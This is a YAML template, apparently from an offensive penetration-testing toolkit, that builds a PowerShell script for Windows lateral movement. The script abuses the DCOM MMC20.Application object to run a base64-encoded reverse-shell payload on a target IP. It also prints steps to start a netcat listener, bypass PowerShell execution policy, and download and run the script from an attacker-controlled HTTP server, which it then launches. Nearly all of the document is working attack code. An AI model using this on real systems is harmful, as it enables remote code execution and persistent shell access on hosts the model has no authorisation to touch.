---
metadata:
  filename: "lateral-movement-template-DCOM-powershell-revshell.yaml"
  tags: ["shell", "windows"]
  created: "2025-03-29"
  author: "Unknown"

content: |
  echo "Answer the following with  a target ip. A powershell script will be generated. If successful, a revshell can be caught at port {{ shell_port }} of your kali."; \
  read --prompt-str "Target IP:" target; \

  echo "\$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application.1','$target'));" > lateral-movement-dcom.ps1; \
  echo "\$dcom.Document.ActiveView.ExecuteShellCommand('powershell',\$null,'{{ include('payloads/revshell-windows-powershell-oneliner-base64encoded') }}','7');" >> lateral-movement-dcom.ps1; \

  mkdir -p packstation/outbound; mv lateral-movement-dcom.ps1 packstation/outbound/; \
  echo '================================================================'; \
  echo '                      -----PowerShell-----                      '; \
  echo 'Preparation 1 (start listener): {{ include('scripts/listener-nc.yaml') }}'; \
  echo 'Without bypass: Open the created file lateral-movement-dcom.ps1 and paste in line by line into powershell'; \
  echo 'Preparation 2 (for save to disk only): powershell -ep bypass'; \
  echo 'Deliver & save to disk: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-dcom.ps1'; \
  echo 'Deliver, save to disk & execute: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port }}/lateral-movement-dcom.ps1 -Outfile {{ delivery_path_windows }}\lateral-movement-dcom.ps1; {{ delivery_path_windows }}\lateral-movement-dcom.ps1'; \
  echo '================================================================'; \
  python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port }} -d packstation/outbound
